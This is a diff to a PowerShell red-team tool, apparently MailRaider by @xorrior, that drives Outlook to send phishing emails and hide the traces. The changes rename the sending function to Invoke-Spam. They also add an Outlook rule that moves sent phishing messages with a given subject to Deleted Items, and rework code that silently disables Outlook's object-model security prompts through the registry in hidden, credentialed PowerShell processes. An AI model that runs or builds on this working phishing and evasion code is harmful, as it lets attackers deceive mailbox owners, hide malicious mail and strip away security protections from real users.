@@ -9,7 +9,7 @@ by @xorrior
 
 #>
 
-Function Send-Email {
+Function Invoke-Spam {
     <#
     .SYNOPSIS
     This function sends emails using a custom or default template to specified target email addresses.
@@ -41,13 +41,13 @@ Function Send-Email {
 
     .EXAMPLE
 
-    Send-Email -Targets $Emails -URL "http://bigorg.com/projections.xls" -Subject "Hi" -Body "Please check this <a href='URL'>link</a> out!"
+    Invoke-Spam -Targets $Emails -URL "http://bigorg.com/projections.xls" -Subject "Hi" -Body "Please check this <a href='URL'>link</a> out!"
 
     Send phishing email to the array of target email addresses with an embedded url. 
 
     .EXAMPLE
 
-    Send-Email -TargetList .\Targets.txt -Attachment .\Notice.rtf -Template .\Phish.html
+    Invoke-Spam -TargetList .\Targets.txt -Attachment .\Notice.rtf -Template .\Phish.html
 
     Send phishing email to the list of addresses from file and include the specified attachment. 
 
@@ -55,7 +55,7 @@ Function Send-Email {
 
     [CmdletBinding()]
     param(
-        [Parameter(Mandatory = $False, Position = 0)]
+        [Parameter(Mandatory = $False, Position = 0, ValueFromPipeline = $True)]
         [string[]]$Targets,
 
         [Parameter(Mandatory = $False, Position = 1)]
@@ -121,6 +121,7 @@ Function Send-Email {
     }
 
 
+    #Invoke-SentItemsRule -Subject "$EmailSubject" -RuleName "MailMan" 
     #Iterate through the list, craft the emails, and then send it off. 
     ForEach($Target in $TargetEmails){
 
@@ -135,11 +136,13 @@ Function Send-Email {
 
         #if there is a signature, add it to the email
         if($Signature){
-            $Email.HTMLBody += "`n`n$Signature"
+            $Email.HTMLBody += "`n`n" + "$Signature"
         }
         $Email.Send()
 
     }
+
+    #Invoke-SentItemsRule -Subject "$EmailSubject" -RuleName "MailMan" -Disable 
    
 }
 
@@ -168,15 +171,24 @@ Function Invoke-SentItemsRule {
 
 
     if($Disable){
-
+        $rule = (($script:Outlook.session).DefaultStore).GetRules() | Where-Object {$_.Name -eq $RuleName}
+        $rule.enabled = $False 
     }
     else{
 
-        $SentItemsFolder = Get-OutlookFolder -Name "SentMail"
+        #$SentItemsFolder = Get-OutlookFolder -Name "SentMail"
         $olRuleType = "Microsoft.Office.Interop.Outlook.OlRuleType" -as [type]
         $MoveTarget = Get-OutlookFolder -Name "DeletedItems"
         $rules = (($script:Outlook.session).DefaultStore).GetRules()
-        $rule = $rules.Create("$RuleName",$olRuleType::OlRuleReceive)
+        $rule = $rules.Create("$RuleName",$olRuleType::olRuleSend)
+        $SubjectCondition = $rule.Conditions.Subject 
+        $SubjectCondition.enabled = $True 
+        $SubjectCondition.Text = @("$Subject")
+        $action = $rule.Actions.MoveToFolder
+        $action.Folder = $MoveTarget
+        $action.enabled = $True
+        $rule.enabled = $True 
+        $rules.Save()
     }
     
 
@@ -311,7 +323,7 @@ Function Disable-SecuritySettings{
     }
     else{
             
-        if((Get-ItemProperty $LMSecurityKey -Name ObjectModelGuard).ObjectModelGuard){
+        if(((Get-ItemProperty $LMSecurityKey -Name ObjectModelGuard).ObjectModelGuard) -ne 2){
             #Save the original value 
             $script:ObjectModelGuardEdited = $True
             $script:OldObjectModelGuard = (Get-ItemProperty $LMSecurityKey -Name ObjectModelGuard).ObjectModelGuard
@@ -331,7 +343,7 @@ Function Disable-SecuritySettings{
       
     }
     else{
-        if((Get-ItemProperty $CUSecurityKey -Name PromptOOMSend).PromptOOMSend){
+        if(((Get-ItemProperty $CUSecurityKey -Name PromptOOMSend).PromptOOMSend) -ne 2){
             #save the old value  
             $script:OldPromptOOMSend = (Get-ItemProperty $CUSecurityKey -Name PromptOOMSend).PromptOOMSend
             $cmd += "Set-ItemProperty $CUSecurityKey -Name PromptOOMSend -Value 2 -Force;"
@@ -341,7 +353,7 @@ Function Disable-SecuritySettings{
             $cmd += "New-ItemProperty $CUSecurityKey -Name PromptOOMSend -Value 2 -PropertyType DWORD -Force;" 
         }
 
-        If((Get-ItemProperty $CUSecurityKey -Name AdminSecurityMode).AdminSecurityMode){
+        If(((Get-ItemProperty $CUSecurityKey -Name AdminSecurityMode).AdminSecurityMode) -ne 3){
             #save the old value 
             $script:OldAdminSecurityMode = (Get-ItemProperty $CUSecurityKey -Name AdminSecurityMode).AdminSecurityMode
             $cmd += "Set-ItemProperty $CUSecurityKey -Name AdminSecurityMode -Value 3 -Force"
@@ -359,7 +371,7 @@ Function Disable-SecuritySettings{
         $pw = ConvertTo-SecureString $Password -asplaintext -Force
         $creds = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$pw
         try {
-            Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd -RedirectStandardError "C:\Users\tester\Desktop\errorforadd.txt"
+            Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd
             $count += 1
         }
         catch {
@@ -451,7 +463,7 @@ Function Reset-SecuritySettings{
         $creds = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $script:DisableUser,$pw
 
         try {
-            Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd -RedirectStandardError "C:\Users\tester\Desktop\errorforremove.txt"
+            Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd
         }
         catch {
             Throw "Unable to reset registry keys"
